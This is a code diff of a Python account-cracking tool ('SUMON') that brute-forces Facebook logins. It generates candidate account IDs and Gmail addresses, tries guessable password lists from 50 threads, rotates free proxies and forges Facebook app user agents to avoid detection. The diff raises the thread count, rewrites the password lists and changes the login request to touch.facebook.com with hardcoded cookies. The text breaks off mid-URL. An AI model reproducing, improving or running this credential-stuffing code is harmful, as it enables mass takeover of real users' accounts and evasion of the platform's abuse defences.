@@ -247,93 +247,6 @@ for ua in range(10000):
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     uas.append(uaku2)
 
-def ua_api():
-    android_version = str(random.randint(4,13))
-    application_version = str(random.randint(100,420))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(100,200))
-    application_version_code = str(random.randint(111111111,999999999))
-    density = random.uniform(1.0,4.0)
-    width = str(random.randint(720,1440))
-    height = str(random.randint(1280,2560))
-    fban = "FB"+str(random.randint(4,6))+"A"
-    fban = random.choice(['FB4A','FB5A','FB6A'])
-    fbpn = random.choice(['com.facebook.katana','com.facebook.orca','messenger-android','com.facebook.lite'])
-    density = random.choice(['2.0','2.25','2.75','3.0','3.25','3 75'])
-    fblc_code = random.choice(["en_US", "en_GB", "en_UK", "en_PK", "en_IN", "ur_PK", "hi_IN", "de_DE"])
-    vivo_model = random.choice(["Vivo X60 Pro", "Vivo V21", "Vivo Y20", "Vivo S9", "Vivo Y72", "Vivo X50 Pro", "Vivo V20", "Vivo Y51", "Vivo S7", "Vivo Y30"])
-    infinix_model = random.choice(["Infinix Zero 8", "Infinix Note 10 Pro", "Infinix Hot 10", "Infinix S5", "Infinix Hot 9", "Infinix Note 8", "Infinix Smart 4", "Infinix Hot 8", "Infinix S4"])
-    realme_model = random.choice(["Realme X50 Pro", "Realme 8 Pro", "Realme Narzo 30 Pro", "Realme C25", "Realme GT", "Realme 7 Pro", "Realme Narzo 20", "Realme C15", "Realme X7 Pro", "Realme 6i"])
-    redme_model = random.choice(["Redmi Note 10 Pro", "Redmi 9", "Redme Note 9 Pro", "Redmi 9A", "Redmi Note 8", "Redmi 9T", "Redmi Note 7", "Redmi 9C", "Redmi Note 10", "Redmi 8 "])
-    oppo_model = random.choice(["Oppo Find X3 Pro", "Oppo Reno 5 Pro", "Oppo A74", "Oppo F19 Pro", "Oppo A54", "Oppo Reno 4 Pro", "Oppo A15", "Oppo F17 Pro", "Oppo A53", "Oppo Reno 3 Pro"])
-    itel_model = random.choice(["Itel A37", "Itel Vision 2", "Itel P37", "Itel A56", "Itel A23 Pro", "Itel A48", "Itel S16", "Itel A25", "Itel A56 Pro", "Itel P36", "Itel S15", "Itel A16", "Itel A36", "Itel S13", "Itel A14", "Itel A52", "Itel A15", "Itel P33", "Itel S12", "Itel A44", "Itel A14 Max", "Itel P32", "Itel S11", "Itel A12", "Itel A23"])
-    nokia_model = random.choice(["Nokia 8.3 5G", "Nokia 5.4", "Nokia 3.4", "Nokia 2.4", "Nokia 8.1", "Nokia 7.2", "Nokia 6.2", "Nokia 5.3", "Nokia 4.2", "Nokia 3.2", "Nokia 2.3", "Nokia 1.4", "Nokia 9 PureView", "Nokia 8 Sirocco", "Nokia 7 Plus", "Nokia 6.1", "Nokia 5.1", "Nokia 3.1", "Nokia 2.2", "Nokia 1.3", "Nokia 9", "Nokia 8", "Nokia 7", "Nokia 6", "Nokia 5"])
-    samsung_model = random.choice(["Samsung Galaxy S21 Ultra", "Samsung Galaxy Note 20 Ultra", "Samsung Galaxy S20 FE", "Samsung Galaxy A52", "Samsung Galaxy A32", "Samsung Galaxy S10+", "Samsung Galaxy Note 10", "Samsung Galaxy A71", "Samsung Galaxy A12", "Samsung Galaxy M31", "Samsung Galaxy S9", "Samsung Galaxy A42", "Samsung Galaxy A22", "Samsung Galaxy A02", "Samsung Galaxy Z Fold 2", "Samsung Galaxy A51", "Samsung Galaxy A31", "Samsung Galaxy M21", "Samsung Galaxy S8", "Samsung Galaxy A72", "Samsung Galaxy A52 5G", "Samsung Galaxy A21s", "Samsung Galaxy M51", "Samsung Galaxy S7", "Samsung Galaxy Note 9"])
-    network_carrier = random.choice(["Airtel", "Jio", "Vi", "BSNL", "Reliance Communications", "Tata Decomo", "Idea Cellular", "MTNL", "Jazz", "Mobilink", "Telenor", "Zong", "Ufone", "Warid Telecom", "Grameen Phone", "Robi Axiata Limited", "Banglalink", "Teletalk", "Citycell", "Nepal Telecom", "Ncell", "Smart Cell", "UTL"])
-    vivo_ua = f"'[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'"
-    infinix_ua = f"'[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'"
-    realme_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'"
-    redmi_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'"
-    oppo_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
-    itel_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
-    nokia_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'"
-    samsung_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTS RUS;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
-    ua_ = random.choice([vivo_ua, infinix_ua, realme_ua, redmi_ua, oppo_ua, itel_ua, nokia_ua, samsung_ua])
-    return ua_
-
-def sexua():
-    android_versions = ['10', '11', '12']
-    mobile_models = [
-        'Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11',
-        'LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3',
-        'OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52',
-        'Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro',
-        'Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II',
-        'Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra',
-        'OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ',
-        'Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2',
-        'OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ',
-        'Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro',
-        'Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play',
-        'Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro',
-        'Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4',
-        'Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro',
-        'Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3',
-        'Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro',
-        'Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus',
-        'Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL',
-        'Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3'
-        # Add more mobile models here
-    ]
-    den = random.choice(['{density=3.0,width=1080,height=2401}'
-,'{density=3.0,width=1080,height=2161}',
-'{density=1.5,width=1280,height=720}',
-'{density=2.0,width=720,height=1344}',
-'{density=1.75,width=720,height=1488}',
-'{density=1.0,width=1066,height=552}',
-'{density=2.0,width=480,height=854}',
-'{density=1.5,width=1200,height=1848}',
-'{density=1.3312501,width=1280,height=736}',
-'{density=3.0,width=1080,height=2208}',
-'{density=4.0,width=1440,height=2392}',
-'{density=1.0,width=320,height=480}',
-'{density=3.0,width=1080,height=1920}',
-'{density=1.46875,width=720,height=1510}',
-'{density=2.625,width=1080,height=2034}',
-'{density=1.5,width=1200,height=1920}',
-'{density=2.0,width=720,height=1280}',
-'{density=2.0,width=720,height=1448}',
-'{density=1.275,width=540,height=1071}'
-])
-    android_version = random.choice(android_versions)
-    mobile_model = random.choice(mobile_models)
-    dev = mobile_model.split(' ')[0]
-    x = str(random.randint(11,999))+".1.0."+str(random.randint(11,99))+"."+str(random.randint(11,99))
-    xx = ''.join(str(random.randint(0, 9)) for _ in range(9))
-    xxx = ''.join(str(random.randint(0, 9)) for _ in range(9))
-    cl = random.choice(['hr_HR','ar_EG','en_Qaau_PK','en_Qaau_GB','en_Qaau_US','as_IN','fa_IR','fi_FI','en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF','ar_Qaau_AR','ar_AR','at_AT','en_AL','en_DZ','en_AS','en_AD','en_AO','en_AI','en_AQ','en_AG','en_AM','en_AW','en_AU','en_AT','en_AZ','en_BS','en_BH','en_BB','en_BY','en_BE','en_BZ','en_BJ','en_BM','en_BT','en_BO','en_BQ','en_BA','en_BW','en_BV','en_BR','en_IO','en_BN','en_BG','en_BF','en_AX','en_ZW','en_ZM','en_YE','en_EH','en_WF','en_VI','en_VG','en_VN','en_VE'])
-    cr = random.choice(['Three','1O1Ocsl','O2','WOM','Telcel','3SE','OneCall','1010','Vodafone IN','Vodafone id','Jazz','Telenor','Zong','Vodefone','Plus','SGP-M1','airtel','Greenphone','StarHub','giga','simyo','BITE','BITE LV','Sprint','inwi','EE','MTS Armenia','UMS','NL KPN','Ufone','China Telecom','SimSim','BAKCELL','Geocell','Jio 4G','Jio','Team','TEAM','UzMobile','Beeline','Vodefone US','A-Mobile','MAGTICOM','XL','axis','Spectrum','ZZ','LMT','Tele2','Fido','CC Network','Shelid','null','TeleTok','SUN Mobile','Club','Lycamobile','VIVIFI','Singtel','Circles','Metro by T-Mobile','YOTA','Turkcell','Uztelecom','Mobiuz','GOLAN T','HUMANS','MegaFon','VIVO','UA-KYIVSTAR','KYIVSTAR','Grameenphone','VIRGIN','Orange'])
-    user_agent = f"[FBAN/EMA;FBBV/{xx};FBAV/{x};FBDV/{mobile_model};FBSV/12;FBCX/notifications_push_client_sync_graphql;FBDM/{{density=2.0}}]"
-    return user_agent
-
 red = "\033[1;31m"
 green = "\033[1;32m"
 yellow = "\033[1;33m"
@@ -345,7 +258,7 @@ N = '\x1b[1;37m'
 cookie_show = []
 #-------------------------(PROXY)----------------------------#
 try:
-  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=in&proxy_format=protocolipport&format=text').text
+  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&timeout=420').text
   open('socksku.txt','w').write(proxylist)
 except Exception as e:
   print(' server error')
@@ -572,24 +485,23 @@ def f_clone():
     for x in file_idz:
         idz.append(x)
     clear()
-    print(" [1] METHOD 1 ")
-    print(" [2] METHOD 2 ")
-    print(" [3] METHOD 3 ")
+    print(f"{green} [1] METHOD 1 ")
+    print(f"{green} [2] METHOD 2 ")
+    print(f"{green} [3] METHOD 3 ")
     linex()
-    m = input(" [â¢] SELECT : ")
+    m = input(f"{green} [-] SELECT : ")
     clear()
-   #print(" [1] CRACK WITH AUTO PASS ")
-    print(" [2] CRACK WITH MANUAL PASS ")
+    print(f"{green} [1] CRACK WITH AUTO PASS ")
+    print(f"{green} [2] CRACK WITH MANUAL PASS ")
     linex()
     p = input("\033[1;32m[\033[1;31m✓\033[1;32m] SELECT : ")
     if p == "1":
-        plist.append("first123")
-        plist.append("first@123")
-        plist.append("first@1234")
         plist.append("firstlast")
-        plist.append("first last")
-        plist.append("57273200")
+        plist.append("first1234")
+        plist.append("firstlast123")
+        plist.append("first123")
         plist.append("59039200")
+        plist.append("57273200")
         plist.append("first@12")
     else:
         clear()
@@ -602,7 +514,7 @@ def f_clone():
         for SUMON in range(plimit):
             ap = input(f" [{SUMON+1}] ENTER PASSWORD : ")
             plist.append(ap)
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=50) as SUMON_xd:
         clear()
         tl = str(len(idz))
         print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNTS : "+tl)
@@ -716,7 +628,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=50) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -725,8 +637,7 @@ def SUMON2():
         linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
-            mk = uid[:6]
-            pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
+            pwx = [uid[:6],uid[:7],uid[:8],uid[:9],uid]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1022,31 +933,20 @@ def g_clone():
     user=[]
     os.system('clear')
     print(logo)
-    print(" Ex First : ayesha, kazim, SUMON ")
-    print(" Ex Last  : rajput, channa, aaraya ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = input(' [â¢] First Name : ')
-    last = input(' [â¢] Last Name  : ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    domain = input(' [â¢] Domain : ')
+    first = random.choice(['sumon','rakesh',])
+    domain = '@gmail.com'
     try:
-        limit = int(input(' [â¢] Crack Limit : '))
+        limit = int(input(' [:] Crack Limit : '))
     except ValueError:
         limit = 5000
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        nmp = ''.join(random.choice(string.digits) for _ in range(3))
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
-    print(" [2] METHOD (METHOD2) ")
-    print(" [3] METHOD (METHOD3) ")
-    print(" [4] METHOD (METHOD4) ")
-    print(" [5] METHOD (METHOD5) ")
-    print(" [6] METHOD (METHOD6) ")
     linex()
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
@@ -1061,31 +961,27 @@ def g_clone():
         tl = str(len(user))
         os.system("clear")
         print(logo)
-        print(' [â¢] CRACKING STARTED ')
-        print(' [â¢] TOTAL ACCOUNT : \033[1;32m'+tl)
-        print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
+        print(f'{green}=> BE PATIENT BABY ')
+        print(f'{green}=> TOTAL LIMID : \033[1;32m'+tl)
+        print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
-            uid = first+'.'+last+'.'+love+domain
-            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            uid = love+domain
+            pwx = [first+'12',first+'123',first+'1234',first+'12345']
+            if SUMONfire =='1':SUMON_xd.submit(mail,uid,pwx,first,tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(mail,uid,pwx,first,tl)
     linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[] CRACK PROCESS COMPLETE')
+    print('[] TOTAL OK ACCOUNTS : '+str(len(oks)))
+    print('[] ID SAVE SUMON-OK TXT')
     linex()
 
 def freefb(uid, name, pwx, tl):
     global loop
     global oks
     global cps
+    global bkas
     sys.stdout.write("\r\033[1;37m [SUMON-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
@@ -1097,57 +993,55 @@ def freefb(uid, name, pwx, tl):
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
             Session = requests.Session()
-            free_fb = Session.get("https://m.facebook.com").text
+            free_fb = Session.get("https://touch.facebook.com").text
             data = {
-                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-                "try_number": "0",
-                "unrecognized_tries": "0",
-                "email": uid,
-                "pass": ps,
-                "login": "Log In",
-            }
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'login_source': 'comet_headerless_login',
+            'next': '',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTABO.AWWmR8Ms-IA',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',}
             headers = {
-            'Host': 'mbasic.facebook.com',
-            'method': 'POST',
-            'path': '/login/Device-based/login/async/',
-            'scheme': 'https',
-            'content-length': '294',
-            'Accept-Encoding': 'gzip',
-            'cache-control': 'max-age=0',
-            'dpr': '1.75',
-            'viewport-width': '980',
-            'sec-ch-ua': '"Not)A;Brand";v="99", "Android WebView";v="127", "Chromium";v="127"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-full-version-list': '',
-            'sec-ch-prefers-color-scheme': 'light',
-            'upgrade-insecure-requests': '1',
-            'user-agent': ua,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'dnt': '1',
-            'origin': 'https://m.prod.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2171902329619611&kid_directed_site=0&app_id=2171902329619611&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D2171902329619611%26cbt%3D1712718663368%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd3261f9021c25370%2526domain%253Dapp.simplified.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.simplified.com%25252Ffe8330d455a57b530%2526relation%253Dopener%26client_id%3D2171902329619611%26display%3Dtouch%26domain%3Dapp.simplified.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fapp.simplified.com%252Flogin%253Fredirect%253D%252Fvideo%2526_gl%253D1%252Aaiox86%252A_ga%252ANTY3NjE0MTg1LjE3MTI3MTg1MjI.%252A_ga_R70FZY7SM9%252AMTcxMjcxODUyMS4xLjEuMTcxMjcxODUyMi41OS4wLjA.%26locale%3Den_US%26logger_id%3Dfb7d32d55c8631da9%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df79832064cb2789df%2526domain%253Dapp.simplified.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.simplified.com%25252Ffe8330d455a57b530%2526relation%253Dopener%2526frame%253Dfb96289a58feadea5%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df79832064cb2789df%26domain%3Dapp.simplified.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fapp